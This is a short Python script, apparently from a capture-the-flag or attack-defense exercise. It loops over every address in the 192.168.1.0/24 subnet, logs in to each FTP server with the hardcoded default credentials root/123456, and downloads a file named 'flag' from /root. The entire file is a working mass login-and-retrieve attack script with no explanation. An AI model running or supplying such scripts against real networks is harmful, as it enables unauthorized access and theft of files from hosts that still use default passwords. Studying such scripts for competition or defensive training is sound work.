from ftplib import FTP
ftp = FTP()
for i in range(254):
	try:
		ip='192.168.1.'+str(i)
		ftp.connect(ip,21,1)
		try:
			ftp.login('root','123456')
			ftp.cwd('/root')
			try:
				ftp.retrbinary("RETR flag",open('flag','a+').write,1024) 
				print i,'download ok'                   
			except:
				print i,'download down'
				ftp.quit()
		except:
			print i,'login down'	
	except:
		print i,'connect down'

